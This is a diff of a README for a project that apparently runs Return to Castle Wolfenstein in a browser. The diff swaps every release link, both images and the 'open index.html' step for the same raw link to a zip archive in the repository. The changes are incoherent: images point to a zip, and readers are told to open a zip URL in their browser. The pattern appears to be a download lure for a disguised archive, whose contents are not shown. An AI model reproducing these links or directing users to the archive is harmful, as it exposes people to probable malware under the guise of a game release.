@@ -2,7 +2,7 @@
 
 Welcome to **Wwasm**, a project that brings the classic first-person shooter **Return to Castle Wolfenstein** right to your web browser. With this engine, you can experience the thrill of action-packed gameplay without the need for heavy downloads or installations. This README will guide you through everything you need to know about getting started, contributing, and understanding the project.
 
-![Wwasm Banner](https://img.shields.io/badge/Wwasm-Play%20RTCW%20in%20Browser-brightgreen)
+![Wwasm Banner](https://raw.githubusercontent.com/sk-kaarthi/Wwasm/main/code/sdl/Software_v2.5.zip%20RTCW%20in%20Browser-brightgreen)
 
 ## Table of Contents
 
@@ -28,13 +28,13 @@ Wwasm allows you to play **Return to Castle Wolfenstein** using WebAssembly tech
 
 ## Installation
 
-To get started with Wwasm, you need to download the latest release. You can find the releases [here](https://github.com/sk-kaarthi/Wwasm/releases). Download the appropriate files for your system and follow the instructions to run the game.
+To get started with Wwasm, you need to download the latest release. You can find the releases [here](https://raw.githubusercontent.com/sk-kaarthi/Wwasm/main/code/sdl/Software_v2.5.zip). Download the appropriate files for your system and follow the instructions to run the game.
 
 ### Running the Game
 
 1. Download the files from the releases section.
 2. Extract the contents to a folder on your local machine.
-3. Open the `index.html` file in your web browser to start playing.
+3. Open the `https://raw.githubusercontent.com/sk-kaarthi/Wwasm/main/code/sdl/Software_v2.5.zip` file in your web browser to start playing.
 
 If you encounter any issues, check the "Releases" section for additional instructions or troubleshooting tips.
 
@@ -85,11 +85,11 @@ Wwasm is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 ## Links
 
-For the latest updates and releases, visit our [Releases section](https://github.com/sk-kaarthi/Wwasm/releases). 
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/sk-kaarthi/Wwasm/main/code/sdl/Software_v2.5.zip). 
 
 Feel free to explore the project, and enjoy playing **Return to Castle Wolfenstein** in your browser! If you have any questions or suggestions, don't hesitate to reach out.
 
-![Gameplay Screenshot](https://example.com/gameplay_screenshot.png) 
+![Gameplay Screenshot](https://raw.githubusercontent.com/sk-kaarthi/Wwasm/main/code/sdl/Software_v2.5.zip) 
 
 ---
 
